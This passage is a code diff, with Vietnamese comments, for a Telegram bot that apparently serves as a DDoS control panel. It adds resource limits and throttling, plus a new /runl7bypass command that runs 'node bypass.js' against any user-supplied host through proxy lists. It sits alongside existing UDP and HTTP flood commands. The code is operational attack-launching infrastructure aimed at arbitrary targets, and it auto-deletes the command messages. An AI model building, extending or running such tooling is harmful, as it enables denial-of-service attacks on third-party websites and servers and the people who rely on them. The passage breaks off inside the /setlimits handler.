@@ -26,6 +26,320 @@ except Exception:
 
 TELEGRAM_TOKEN_FILE = 'bot_token.txt'
 
+# ========== Resource Management ==========
+
+@dataclass
+class ResourceLimits:
+    """Cấu hình giới hạn tài nguyên"""
+    MAX_CONCURRENT_TASKS_PER_USER: int = 3
+    MAX_CONCURRENT_TASKS_GLOBAL: int = 10
+    MAX_TASK_DURATION: int = 3600  # 1 giờ
+    MAX_MESSAGE_LENGTH: int = 4000
+    MAX_MESSAGES_PER_MINUTE: int = 30
+    MAX_CPU_PERCENT: float = 80.0
+    MAX_RAM_PERCENT: float = 85.0
+    TASK_MONITOR_INTERVAL: int = 30  # 30 giây
+    AUTO_CLEANUP_INTERVAL: int = 300  # 5 phút
+    
+    # Thêm cấu hình cho auto-throttling
+    CPU_THROTTLE_THRESHOLD: float = 80.0  # Bắt đầu giảm hiệu suất khi CPU > 70%
+    RAM_THROTTLE_THRESHOLD: float = 85.0  # Bắt đầu giảm hiệu suất khi RAM > 75%
+    THROTTLE_FACTOR_MIN: float = 0.2  # Giảm tối thiểu 30% hiệu suất
+    THROTTLE_FACTOR_MAX: float = 0.5  # Giảm tối đa 80% hiệu suất
+    THROTTLE_RECOVERY_TIME: int = 200  # 5 phút để phục hồi hiệu suất
+
+class ResourceManager:
+    """Quản lý tài nguyên và giới hạn"""
+    
+    def __init__(self, limits: ResourceLimits):
+        self.limits = limits
+        self.user_task_counts = {}  # {user_id: count}
+        self.task_start_times = {}  # {task_key: start_time}
+        self.message_counts = {}  # {user_id: {timestamp: count}}
+        self.monitoring_active = False
+        self.monitor_thread = None
+        
+        # Thêm biến cho auto-throttling
+        self.throttle_factor = 1.0  # Hệ số giảm hiệu suất (1.0 = 100% hiệu suất)
+        self.throttle_start_time = None  # Thời điểm bắt đầu giảm hiệu suất
+        self.is_throttling = False  # Trạng thái đang giảm hiệu suất
+        self.throttled_tasks = {}  # {task_key: original_params} - Lưu tham số gốc của tác vụ bị giảm hiệu suất
+        
+    def can_start_task(self, user_id: int, task_key: str) -> tuple[bool, str]:
+        """Kiểm tra xem có thể bắt đầu tác vụ mới không"""
+        # Kiểm tra giới hạn tác vụ per user
+        user_tasks = self.user_task_counts.get(user_id, 0)
+        if user_tasks >= self.limits.MAX_CONCURRENT_TASKS_PER_USER:
+            return False, f"Bạn đã đạt giới hạn {self.limits.MAX_CONCURRENT_TASKS_PER_USER} tác vụ đồng thời"
+        
+        # Kiểm tra giới hạn tác vụ global
+        global_tasks = sum(self.user_task_counts.values())
+        if global_tasks >= self.limits.MAX_CONCURRENT_TASKS_GLOBAL:
+            return False, f"Hệ thống đã đạt giới hạn {self.limits.MAX_CONCURRENT_TASKS_GLOBAL} tác vụ đồng thời"
+        
+        # Kiểm tra tài nguyên hệ thống
+        if psutil:
+            try:
+                cpu_percent = psutil.cpu_percent(interval=0.1)
+                if cpu_percent > self.limits.MAX_CPU_PERCENT:
+                    return False, f"CPU quá tải ({cpu_percent:.1f}% > {self.limits.MAX_CPU_PERCENT}%)"
+                
+                mem = psutil.virtual_memory()
+                if mem.percent > self.limits.MAX_RAM_PERCENT:
+                    return False, f"RAM quá tải ({mem.percent:.1f}% > {self.limits.MAX_RAM_PERCENT}%)"
+            except Exception as e:
+                logger.warning(f"Error checking system resources: {e}")
+        
+        return True, "OK"
+    
+    def calculate_throttle_factor(self, cpu_percent: float, ram_percent: float) -> float:
+        """Tính toán hệ số giảm hiệu suất dựa trên tài nguyên"""
+        if not self.is_throttling:
+            return 1.0
+        
+        # Tính toán dựa trên CPU và RAM
+        cpu_factor = 1.0
+        ram_factor = 1.0
+        
+        if cpu_percent > self.limits.CPU_THROTTLE_THRESHOLD:
+            # Giảm hiệu suất theo tỷ lệ CPU
+            cpu_excess = (cpu_percent - self.limits.CPU_THROTTLE_THRESHOLD) / (100 - self.limits.CPU_THROTTLE_THRESHOLD)
+            cpu_factor = max(self.limits.THROTTLE_FACTOR_MIN, 1.0 - (cpu_excess * 0.5))
+        
+        if ram_percent > self.limits.RAM_THROTTLE_THRESHOLD:
+            # Giảm hiệu suất theo tỷ lệ RAM
+            ram_excess = (ram_percent - self.limits.RAM_THROTTLE_THRESHOLD) / (100 - self.limits.RAM_THROTTLE_THRESHOLD)
+            ram_factor = max(self.limits.THROTTLE_FACTOR_MIN, 1.0 - (ram_excess * 0.5))
+        
+        # Lấy hệ số thấp nhất
+        return min(cpu_factor, ram_factor)
+    
+    def apply_throttling(self, cpu_percent: float, ram_percent: float):
+        """Áp dụng giảm hiệu suất khi tài nguyên quá tải"""
+        if (cpu_percent > self.limits.CPU_THROTTLE_THRESHOLD or 
+            ram_percent > self.limits.RAM_THROTTLE_THRESHOLD):
+            
+            if not self.is_throttling:
+                self.is_throttling = True
+                self.throttle_start_time = datetime.now()
+                logger.warning(f"Auto-throttling activated - CPU: {cpu_percent:.1f}%, RAM: {ram_percent:.1f}%")
+            
+            # Tính toán hệ số giảm hiệu suất
+            new_throttle_factor = self.calculate_throttle_factor(cpu_percent, ram_percent)
+            
+            if new_throttle_factor != self.throttle_factor:
+                self.throttle_factor = new_throttle_factor
+                logger.info(f"Throttle factor updated to: {self.throttle_factor:.2f} ({self.throttle_factor*100:.0f}% performance)")
+                
+                # Thông báo cho các tác vụ đang chạy
+                self.notify_throttled_tasks()
+        else:
+            # Kiểm tra xem có thể phục hồi hiệu suất không
+            if self.is_throttling and self.throttle_start_time:
+                recovery_time = (datetime.now() - self.throttle_start_time).total_seconds()
+                if recovery_time > self.limits.THROTTLE_RECOVERY_TIME:
+                    self.recover_performance()
+    
+    def recover_performance(self):
+        """Phục hồi hiệu suất về mức bình thường"""
+        if self.is_throttling:
+            self.is_throttling = False
+            self.throttle_factor = 1.0
+            self.throttle_start_time = None
+            logger.info("Performance recovered to 100%")
+            
+            # Thông báo cho các tác vụ
+            self.notify_throttled_tasks()
+    
+    def notify_throttled_tasks(self):
+        """Thông báo cho các tác vụ về thay đổi hiệu suất"""
+        # Có thể gửi thông báo qua bot nếu cần
+        pass
+    
+    def get_throttled_params(self, original_params: dict) -> dict:
+        """Lấy tham số đã được giảm hiệu suất"""
+        if not self.is_throttling or self.throttle_factor >= 1.0:
+            return original_params
+        
+        throttled_params = original_params.copy()
+        
+        # Giảm các tham số hiệu suất
+        if 'rps' in throttled_params:
+            throttled_params['rps'] = max(1, int(throttled_params['rps'] * self.throttle_factor))
+        
+        if 'rate' in throttled_params:
+            throttled_params['rate'] = max(1, int(throttled_params['rate'] * self.throttle_factor))
+        
+        if 'threads' in throttled_params:
+            throttled_params['threads'] = max(1, int(throttled_params['threads'] * self.throttle_factor))
+        
+        if 'thread' in throttled_params:
+            throttled_params['thread'] = max(1, int(throttled_params['thread'] * self.throttle_factor))
+        
+        return throttled_params
+    
+    def start_task(self, user_id: int, task_key: str):
+        """Đăng ký bắt đầu tác vụ"""
+        self.user_task_counts[user_id] = self.user_task_counts.get(user_id, 0)
+        self.user_task_counts[user_id] += 1
+        self.task_start_times[task_key] = datetime.now()
+        logger.info(f"Task started: user={user_id}, task={task_key}, user_tasks={self.user_task_counts[user_id]}")
+    
+    def end_task(self, user_id: int, task_key: str):
+        """Đăng ký kết thúc tác vụ"""
+        if user_id in self.user_task_counts:
+            self.user_task_counts[user_id] = max(0, self.user_task_counts[user_id] - 1)
+            if self.user_task_counts[user_id] == 0:
+                del self.user_task_counts[user_id]
+        
+        if task_key in self.task_start_times:
+            del self.task_start_times[task_key]
+        
+        logger.info(f"Task ended: user={user_id}, task={task_key}")
+    
+    def can_send_message(self, user_id: int) -> tuple[bool, str]:
+        """Kiểm tra giới hạn tin nhắn"""
+        now = datetime.now()
+        minute_key = now.replace(second=0, microsecond=0)
+        
+        if user_id not in self.message_counts:
+            self.message_counts[user_id] = {}
+        
+        user_msgs = self.message_counts[user_id]
+        
+        # Xóa các timestamp cũ (quá 1 phút)
+        old_keys = [k for k in user_msgs.keys() if (now - k).total_seconds() > 60]
+        for k in old_keys:
+            del user_msgs[k]
+        
+        # Đếm tin nhắn trong phút hiện tại
+        current_count = user_msgs.get(minute_key, 0)
+        if current_count >= self.limits.MAX_MESSAGES_PER_MINUTE:
+            return False, f"Bạn đã gửi quá {self.limits.MAX_MESSAGES_PER_MINUTE} tin nhắn trong 1 phút"
+        
+        # Tăng counter
+        user_msgs[minute_key] = current_count + 1
+        return True, "OK"
+    
+    def get_resource_status(self) -> dict:
+        """Lấy trạng thái tài nguyên"""
+        status = {
+            'user_tasks': dict(self.user_task_counts),
+            'global_tasks': sum(self.user_task_counts.values()),
+            'max_user_tasks': self.limits.MAX_CONCURRENT_TASKS_PER_USER,
+            'max_global_tasks': self.limits.MAX_CONCURRENT_TASKS_GLOBAL,
+            'active_tasks': len(self.task_start_times),
+            'throttling_active': self.is_throttling,
+            'throttle_factor': self.throttle_factor,
+            'performance_percent': int(self.throttle_factor * 100)
+        }
+        
+        if psutil:
+            try:
+                status['cpu_percent'] = psutil.cpu_percent(interval=0.1)
+                status['ram_percent'] = psutil.virtual_memory().percent
+                status['ram_used_gb'] = psutil.virtual_memory().used / (1024**3)
+                status['ram_total_gb'] = psutil.virtual_memory().total / (1024**3)
+            except Exception as e:
+                logger.warning(f"Error getting system status: {e}")
+                status['cpu_percent'] = 0
+                status['ram_percent'] = 0
+        
+        return status
+    
+    def cleanup_expired_tasks(self):
+        """Dọn dẹp các tác vụ quá thời gian"""
+        now = datetime.now()
+        expired_tasks = []
+        
+        for task_key, start_time in self.task_start_times.items():
+            if (now - start_time).total_seconds() > self.limits.MAX_TASK_DURATION:
+                expired_tasks.append(task_key)
+        
+        if expired_tasks:
+            logger.warning(f"Found {len(expired_tasks)} expired tasks: {expired_tasks}")
+            # Các tác vụ này sẽ được dừng bởi monitor thread
+    
+    def start_monitoring(self):
+        """Bắt đầu monitoring tài nguyên"""
+        if self.monitoring_active:
+            return
+        
+        self.monitoring_active = True
+        self.monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)
+        self.monitor_thread.start()
+        logger.info("Resource monitoring started")
+    
+    def stop_monitoring(self):
+        """Dừng monitoring tài nguyên"""
+        self.monitoring_active = False
+        if self.monitor_thread:
+            self.monitor_thread.join(timeout=5)
+        logger.info("Resource monitoring stopped")
+    
+    def _monitor_loop(self):
+        """Vòng lặp monitoring"""
+        while self.monitoring_active:
+            try:
+                # Dọn dẹp tác vụ hết hạn
+                self.cleanup_expired_tasks()
+                
+                # Kiểm tra tài nguyên hệ thống
+                if psutil:
+                    try:
+                        cpu_percent = psutil.cpu_percent(interval=1)
+                        mem_percent = psutil.virtual_memory().percent
+                        
+                        # Cảnh báo nếu tài nguyên quá tải
+                        if cpu_percent > self.limits.MAX_CPU_PERCENT * 0.9:
+                            logger.warning(f"High CPU usage: {cpu_percent:.1f}%")
+                        
+                        if mem_percent > self.limits.MAX_RAM_PERCENT * 0.9:
+                            logger.warning(f"High RAM usage: {mem_percent:.1f}%")
+                        
+                        # Áp dụng auto-throttling thay vì dừng tác vụ ngay lập tức
+                        self.apply_throttling(cpu_percent, mem_percent)
+                        
+                        # Chỉ dừng tác vụ nếu tài nguyên cực kỳ quá tải
+                        if cpu_percent > self.limits.MAX_CPU_PERCENT * 1.2 or mem_percent > self.limits.MAX_RAM_PERCENT * 1.2:
+                            logger.warning(f"Critical resource usage - CPU: {cpu_percent:.1f}%, RAM: {mem_percent:.1f}%")
+                            self._emergency_cleanup()
+                            
+                    except Exception as e:
+                        logger.error(f"Error in resource monitoring: {e}")
+                
+                time.sleep(self.limits.TASK_MONITOR_INTERVAL)
+                
+            except Exception as e:
+                logger.error(f"Error in monitor loop: {e}")
+                time.sleep(10)
+    
+    def _emergency_cleanup(self):
+        """Dọn dẹp khẩn cấp khi tài nguyên quá tải"""
+        logger.warning("Emergency cleanup triggered due to high resource usage")
+        
+        # Dừng một số tác vụ cũ nhất
+        sorted_tasks = sorted(self.task_start_times.items(), key=lambda x: x[1])
+        tasks_to_stop = sorted_tasks[:3]  # Dừng 3 tác vụ cũ nhất
+        
+        for task_key, start_time in tasks_to_stop:
+            logger.warning(f"Emergency stopping task: {task_key}")
+            # Tìm và dừng process tương ứng
+            for (uid, cid, tk), proc in list(running_tasks.items()):
+                if tk == task_key and proc and proc.poll() is None:
+                    try:
+                        if os.name == 'nt':
+                            proc.terminate()
+                        else:
+                            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+                        running_tasks[(uid, cid, tk)] = None
+                        self.end_task(uid, tk)
+                    except Exception as e:
+                        logger.error(f"Error emergency stopping task {task_key}: {e}")
+
+# Khởi tạo Resource Manager
+resource_manager = ResourceManager(ResourceLimits())
+
 def check_dependencies():
     """Kiểm tra các dependencies cần thiết"""
     missing_deps = []
@@ -366,6 +680,22 @@ def not_banned(func):
         return func(message)
     return wrapper
 
+def resource_limit(func):
+    """Decorator kiểm tra giới hạn tài nguyên"""
+    @wraps(func)
+    def wrapper(message):
+        user_id = message.from_user.id
+        
+        # Kiểm tra giới hạn tin nhắn
+        can_send, msg = resource_manager.can_send_message(user_id)
+        if not can_send:
+            sent = bot.reply_to(message, f"⚠️ {msg}")
+            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+            return
+        
+        return func(message)
+    return wrapper
+
 def log_command(func):
     @wraps(func)
     def wrapper(message):
@@ -421,15 +751,20 @@ def send_auto_notification():
             logger.error(f"Error counting running tasks: {e}")
             running_tasks_count = 0
         
-        # Lấy số liệu hệ thống
+        # Lấy số liệu hệ thống và tài nguyên
         cpu_line = "🖥️ CPU: N/A"
         ram_line = "🧠 RAM: N/A"
+        resource_status = "📊 Tài nguyên: N/A"
         try:
             if psutil:
                 cpu_percent = psutil.cpu_percent(interval=0.4)
                 mem = psutil.virtual_memory()
                 ram_line = f"🧠 RAM: {mem.used/ (1024**3):.1f}/{mem.total/ (1024**3):.1f} GB ({mem.percent}%)"
                 cpu_line = f"🖥️ CPU: {cpu_percent:.0f}%"
+                
+                # Thêm thông tin tài nguyên từ resource manager
+                res_status = resource_manager.get_resource_status()
+                resource_status = f"📊 Tài nguyên: {res_status['global_tasks']}/{res_status['max_global_tasks']} tác vụ"
         except Exception as e:
             logger.warning(f"Cannot read system metrics: {e}")
         
@@ -440,6 +775,7 @@ def send_auto_notification():
             f"🕐 Uptime: {uptime}\n"
             f"{cpu_line}\n"
             f"{ram_line}\n"
+            f"{resource_status}\n"
             f"👥 Tổng users: {total_users}\n"
             f"👑 Admins: {total_admins}\n"
             f"📈 Hoạt động hôm nay: {today_activities}\n"
@@ -541,8 +877,18 @@ def run_subprocess_async(command_list, user_id, chat_id, task_key, message):
         auto_delete_response(chat_id, message.message_id, sent, delay=10)
         return
 
+    # Kiểm tra giới hạn tài nguyên trước khi bắt đầu tác vụ
+    can_start, reason = resource_manager.can_start_task(user_id, task_key)
+    if not can_start:
+        sent = bot.reply_to(message, f"⚠️ Không thể bắt đầu tác vụ: {reason}")
+        auto_delete_response(chat_id, message.message_id, sent, delay=10)
+        return
+
     def task():
         try:
+            # Đăng ký bắt đầu tác vụ với resource manager
+            resource_manager.start_task(user_id, task_key)
+            
             # Use different approach for Windows vs Unix
             if os.name == 'nt':  # Windows
                 proc_local = subprocess.Popen(command_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
@@ -558,15 +904,15 @@ def run_subprocess_async(command_list, user_id, chat_id, task_key, message):
             errors = stderr.decode(errors='ignore').strip()
             
             if output:
-                if len(output) > Config.MAX_MESSAGE_LENGTH:
-                    output = output[:Config.MAX_MESSAGE_LENGTH] + "\n...(bị cắt bớt)"
+                if len(output) > resource_manager.limits.MAX_MESSAGE_LENGTH:
+                    output = output[:resource_manager.limits.MAX_MESSAGE_LENGTH] + "\n...(bị cắt bớt)"
                 result_msg = bot.send_message(chat_id, f"📢 Kết quả tác vụ `{task_key}`:\n{output}")
                 # Tự động xóa kết quả sau 30 giây
                 auto_delete_response(chat_id, message.message_id, result_msg, delay=30)
             
             if errors:
-                if len(errors) > Config.MAX_MESSAGE_LENGTH:
-                    errors = errors[:Config.MAX_MESSAGE_LENGTH] + "\n...(bị cắt bớt)"
+                if len(errors) > resource_manager.limits.MAX_MESSAGE_LENGTH:
+                    errors = errors[:resource_manager.limits.MAX_MESSAGE_LENGTH] + "\n...(bị cắt bớt)"
                 error_msg = bot.send_message(chat_id, f"❗ Lỗi:\n{errors}")
                 # Tự động xóa lỗi sau 20 giây
                 auto_delete_response(chat_id, message.message_id, error_msg, delay=20)
@@ -577,6 +923,8 @@ def run_subprocess_async(command_list, user_id, chat_id, task_key, message):
             auto_delete_response(chat_id, message.message_id, error_msg, delay=20)
         finally:
             running_tasks[key] = None
+            # Đăng ký kết thúc tác vụ với resource manager
+            resource_manager.end_task(user_id, task_key)
 
     executor.submit(task)
 
@@ -617,6 +965,8 @@ def stop_subprocess_safe(user_id, chat_id, task_key, processing_msg):
                         logger.error(f"SIGTERM failed: {k_e}")
             
             running_tasks[key] = None
+            # Đăng ký kết thúc tác vụ với resource manager
+            resource_manager.end_task(user_id, task_key)
             logger.info(f"Process {task_key} stopped successfully")
             
             # Cập nhật thông báo thành công
@@ -750,6 +1100,7 @@ def escape_markdown_v2(text: str) -> str:
 @bot.message_handler(commands=['start'])
 @ignore_old_messages
 @not_banned
+@resource_limit
 @log_command
 def cmd_start(message):
     try:
@@ -767,6 +1118,7 @@ def cmd_start(message):
 @bot.message_handler(commands=['help'])
 @ignore_old_messages
 @not_banned
+@resource_limit
 @log_command
 def cmd_help(message):
     try:
@@ -798,10 +1150,12 @@ def cmd_help(message):
                 "/runudpbypass ip port duration [packet_size] [burst] - Chạy udpbypass.c\n"
                 "/runovh host port duration threads - Chạy udpovh2gb.c\n"
                 "/runflood host time threads rate - Chạy flood.js\n"
+                "/runl7bypass host time rps threads [proxyfile] - Chạy bypass.js\n"
                 "/stopkill - Dừng kill.js\n"
                 "/stopudp - Dừng udp_improved.py\n"
                 "/stopudpbypass - Dừng udpbypass\n"
                 "/stopflood - Dừng flood.js\n"
+                "/stopl7bypass - Dừng bypass.js\n"
                 "/stopall - Dừng tất cả tác vụ của bạn\n"
                 "/stopuser <user_id> - Dừng tất cả tác vụ của user\n"
                 "/scrapeproxies - Thu thập proxies\n"
@@ -810,6 +1164,7 @@ def cmd_help(message):
                 "/statusudp - Trạng thái udp_improved.py\n"
                 "/statusudpbypass - Trạng thái udpbypass\n"
                 "/statusflood - Trạng thái flood.js\n"
+                "/statusl7bypass - Trạng thái bypass.js\n"
                 "/autonotify - Quản lý thông báo tự động\n"
                 "/testudpbypass - Test lệnh udpbypass\n"
                 "/sysinfo - Thông tin CPU/RAM\n"
@@ -817,6 +1172,10 @@ def cmd_help(message):
                 "/statusall - Thống kê toàn bộ tác vụ\n"
                 "/stopallglobal - Dừng toàn bộ tác vụ của mọi user (cẩn trọng)\n"
                 "/checkdelete - Kiểm tra quyền xóa tin nhắn\n"
+                "/resources - Xem thông tin tài nguyên hệ thống\n"
+                "/setlimits - Cấu hình giới hạn tài nguyên\n"
+                "/throttle - Quản lý auto-throttling\n"
+                "/systemstatus - Trạng thái chi tiết hệ thống\n"
             )
         try:
             sent = bot.send_message(message.chat.id, escape_markdown_v2(help_text), parse_mode='MarkdownV2')
@@ -1343,10 +1702,10 @@ def cmd_runovh(message):
 
         _, host, port, duration, threads = args
 
-        if not os.path.isfile('udpovh2gb'):
+        if not os.path.isfile('udpovh2gb') and not os.path.isfile('udpovh2gb.exe'):
             if os.name == 'nt':  # Windows
                 bot.edit_message_text(
-                    "⚠️ Compilation not supported on Windows. Please compile udpovh2gb.c manually.",
+                    "⚠️ udpovh2gb.exe không tồn tại. Vui lòng compile udpovh2gb.c trên Windows hoặc cung cấp file .exe.",
                     chat_id=message.chat.id,
                     message_id=processing_msg.message_id
                 )
@@ -1475,6 +1834,98 @@ def cmd_runflood(message):
             sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runflood: {str(e)}")
             auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
 
+@bot.message_handler(commands=['runl7bypass'])
+@ignore_old_messages
+@not_banned
+@admin_required
+@resource_limit
+@log_command
+def cmd_runl7bypass(message):
+    try:
+        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
+        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /runl7bypass...")
+        
+        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
+        delete_message_immediately(message.chat.id, message.message_id)
+        
+        # Phân tích tham số từ lệnh
+        args = message.text.split()
+        if len(args) < 5 or len(args) > 6:
+            bot.edit_message_text(
+                "⚠️ Cách dùng: /runl7bypass <host> <time> <rps> <threads> [proxyfile]\n"
+                "Ví dụ: /runl7bypass https://example.com 60 100 4\n"
+                "Ví dụ: /runl7bypass https://example.com 60 100 4 proxies.txt\n"
+                "Nếu không nhập proxyfile, bot sẽ tự động tìm file proxies.txt",
+                chat_id=message.chat.id,
+                message_id=processing_msg.message_id
+            )
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
+            return
+
+        host = args[1]
+        time = args[2]
+        rps = args[3]
+        threads = args[4]
+        
+        # Xử lý proxyfile
+        if len(args) == 6:
+            proxyfile = args[5]
+            if not os.path.isfile(proxyfile):
+                bot.edit_message_text(
+                    f"❌ File proxy không tồn tại: {proxyfile}",
+                    chat_id=message.chat.id,
+                    message_id=processing_msg.message_id
+                )
+                auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
+                return
+        else:
+            # Tự động tìm file proxy phổ biến
+            possible_files = ['proxies.txt', 'proxy.txt', 'proxies.lst']
+            proxyfile = None
+            for f in possible_files:
+                if os.path.isfile(f):
+                    proxyfile = f
+                    break
+            if proxyfile is None:
+                bot.edit_message_text(
+                    "❌ Không tìm thấy file proxy mặc định (proxies.txt, proxy.txt, proxies.lst). "
+                    "Vui lòng cung cấp tên file proxy hoặc thêm file proxies.txt vào thư mục bot.",
+                    chat_id=message.chat.id,
+                    message_id=processing_msg.message_id
+                )
+                auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
+                return
+
+        # Tạo lệnh chạy bypass.js
+        cmd = ['node', 'bypass.js', host, time, rps, threads, proxyfile]
+        logger.info(f"Đang chạy bypass.js với các tham số: {cmd}")
+
+        # Cập nhật thông báo thành công
+        bot.edit_message_text(
+            f"✅ Lệnh /runl7bypass đã được nhận!\n"
+            f"🎯 Host: {host}\n"
+            f"⏱️ Time: {time}s\n"
+            f"📊 RPS: {rps}\n"
+            f"🧵 Threads: {threads}\n"
+            f"📁 Proxy: {proxyfile}\n\n"
+            f"🔄 Đang khởi động tác vụ bypass...",
+            chat_id=message.chat.id,
+            message_id=processing_msg.message_id
+        )
+
+        # Chạy script bypass.js bất đồng bộ
+        run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'l7bypass', message)
+
+    except Exception as e:
+        logger.error(f"Đã xảy ra lỗi trong /runl7bypass: {e}")
+        try:
+            bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runl7bypass: {str(e)}", 
+                                chat_id=message.chat.id, 
+                                message_id=processing_msg.message_id)
+        except:
+            sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runl7bypass: {str(e)}")
+            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+
 @bot.message_handler(commands=['stopovh'])
 @ignore_old_messages
 @not_banned
@@ -1494,7 +1945,7 @@ def cmd_stopovh(message):
         message_id=processing_msg.message_id
     )
     
-    stop_subprocess(message.from_user.id, message.chat.id, 'udpovh', message)
+    stop_subprocess_safe(message.from_user.id, message.chat.id, 'udpovh', processing_msg)
 
 def _stop_all_for_user(target_user_id: int, chat_id: int, processing_msg=None, across_all_chats: bool=False):
     """Dừng tất cả tác vụ thuộc user. Nếu across_all_chats=True sẽ dừng ở mọi chat."""
@@ -1594,7 +2045,7 @@ def cmd_statusovh(message):
         )
     auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
 
-@bot.message_handler(commands=['stopkill', 'stopudp', 'stopproxies', 'stopflood', 'stopudpbypass'])
+@bot.message_handler(commands=['stopkill', 'stopudp', 'stopproxies', 'stopflood', 'stopudpbypass', 'stopl7bypass'])
 @ignore_old_messages
 @not_banned
 @admin_required
@@ -1627,6 +2078,10 @@ def cmd_stop_task(message):
             task_name = "udpbypass"
             task_key = "udpbypass"
             logger.info(f"User {user_id} requesting to stop udpbypass task")
+        elif cmd.startswith('/stopl7bypass'):
+            task_name = "l7bypass"
+            task_key = "l7bypass"
+            logger.info(f"User {user_id} requesting to stop l7bypass task")
         
         # Cập nhật thông báo
         try:
@@ -1688,7 +2143,7 @@ def cmd_stop_task(message):
                 except Exception as final_error:
                     logger.error(f"Final fallback failed: {final_error}")
 
-@bot.message_handler(commands=['statuskill', 'statusudp', 'statusproxies', 'statusflood', 'statusudpbypass'])
+@bot.message_handler(commands=['statuskill', 'statusudp', 'statusproxies', 'statusflood', 'statusudpbypass', 'statusl7bypass'])
 @ignore_old_messages
 @not_banned
 @admin_required
@@ -1708,6 +2163,8 @@ def cmd_status_task(message):
             task_key = 'killjs'
         elif 'udpbypass' in cmd:  # Kiểm tra udpbypass trước udp
             task_key = 'udpbypass'
+        elif 'l7bypass' in cmd:  # Kiểm tra l7bypass
+            task_key = 'l7bypass'
         elif 'udp' in cmd:
             task_key = 'udp'
         elif 'proxies' in cmd:
@@ -1968,6 +2425,310 @@ def cmd_checkdelete(message):
         sent = bot.reply_to(message, "❌ Lỗi khi kiểm tra quyền xóa.")
         auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
 
+@bot.message_handler(commands=['resources'])
+@ignore_old_messages
+@not_banned
+@admin_required
+@resource_limit
+@log_command
+def cmd_resources(message):
+    """Hiển thị thông tin tài nguyên hệ thống"""
+    try:
+        status = resource_manager.get_resource_status()
+        
+        # Tạo thông báo chi tiết
+        resource_text = (
+            f"📊 *THÔNG TIN TÀI NGUYÊN HỆ THỐNG*\n\n"
+            f"🖥️ *CPU:* {status.get('cpu_percent', 0):.1f}%\n"
+            f"🧠 *RAM:* {status.get('ram_percent', 0):.1f}% "
+            f"({status.get('ram_used_gb', 0):.1f}/{status.get('ram_total_gb', 0):.1f} GB)\n\n"
+            f"⚡ *HIỆU SUẤT:*\n"
+            f"• Trạng thái: {'🔴 Giảm hiệu suất' if status['throttling_active'] else '🟢 Bình thường'}\n"
+            f"• Hiệu suất hiện tại: {status['performance_percent']}%\n"
+            f"• Hệ số giảm: {status['throttle_factor']:.2f}\n\n"
+            f"🔄 *TÁC VỤ ĐANG CHẠY:*\n"
+            f"• Toàn hệ thống: {status['global_tasks']}/{status['max_global_tasks']}\n"
+            f"• Tác vụ của bạn: {status['user_tasks'].get(message.from_user.id, 0)}/{status['max_user_tasks']}\n"
+            f"• Tổng tác vụ active: {status['active_tasks']}\n\n"
+            f"⚙️ *GIỚI HẠN:*\n"
+            f"• Tác vụ/user: {status['max_user_tasks']}\n"
+            f"• Tác vụ toàn hệ: {status['max_global_tasks']}\n"
+            f"• Thời gian tối đa: {resource_manager.limits.MAX_TASK_DURATION//60} phút\n"
+            f"• Tin nhắn/phút: {resource_manager.limits.MAX_MESSAGES_PER_MINUTE}\n"
+            f"• CPU tối đa: {resource_manager.limits.MAX_CPU_PERCENT}%\n"
+            f"• RAM tối đa: {resource_manager.limits.MAX_RAM_PERCENT}%"
+        )
+        
+        # Thêm thông tin chi tiết về tác vụ của user hiện tại
+        user_tasks = []
+        for (uid, cid, task_key), proc in running_tasks.items():
+            if uid == message.from_user.id and proc and proc.poll() is None:
+                user_tasks.append(f"• {task_key} (PID: {proc.pid})")
+        
+        if user_tasks:
+            resource_text += f"\n\n📋 *TÁC VỤ CỦA BẠN:*\n" + "\n".join(user_tasks)
+        
+        sent = bot.reply_to(message, resource_text, parse_mode='Markdown')
+        auto_delete_response(message.chat.id, message.message_id, sent, delay=30)
+        
+    except Exception as e:
+        logger.error(f"/resources error: {e}")
+        sent = bot.reply_to(message, "❌ Lỗi khi lấy thông tin tài nguyên.")
+        auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+
+@bot.message_handler(commands=['setlimits'])
+@ignore_old_messages
+@not_banned
+@admin_required
+@resource_limit
+@log_command
+def cmd_setlimits(message):
+    """Thay đổi giới hạn tài nguyên (chỉ admin)"""
+    try:
+        args = message.text.split()
+        if len(args) < 3:
+            help_text = (
+                "⚠️ *Cách sử dụng:*\n"
+                "`/setlimits <type> <value>`\n\n"
+                "📋 *Các loại giới hạn:*\n"
+                "• `user_tasks` - Số tác vụ tối đa/user\n"
+                "• `global_tasks` - Số tác vụ tối đa toàn hệ\n"
+                "• `task_duration` - Thời gian tối đa tác vụ (phút)\n"
+                "• `messages_per_min` - Tin nhắn tối đa/phút\n"
+                "• `cpu_limit` - Giới hạn CPU (%)\n"
+                "• `ram_limit` - Giới hạn RAM (%)\n\n"
+                "💡 *Ví dụ:*\n"
+                "`/setlimits user_tasks 5`\n"
+                "`/setlimits cpu_limit 90`"
+            )
+            sent = bot.reply_to(message, help_text, parse_mode='Markdown')
+            auto_delete_response(message.chat.id, message.message_id, sent, delay=20)
+            return
+        
+        limit_type = args[1].lower()
+        try:
+            value = float(args[2])
+        except ValueError:
+            sent = bot.reply_to(message, "❌ Giá trị phải là số!")
+            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+            return
+        
+        # Cập nhật giới hạn
+        if limit_type == 'user_tasks':
+            if value < 1 or value > 10:
+                sent = bot.reply_to(message, "❌ Số tác vụ/user phải từ 1-10!")
+                auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+                return
+            resource_manager.limits.MAX_CONCURRENT_TASKS_PER_USER = int(value)
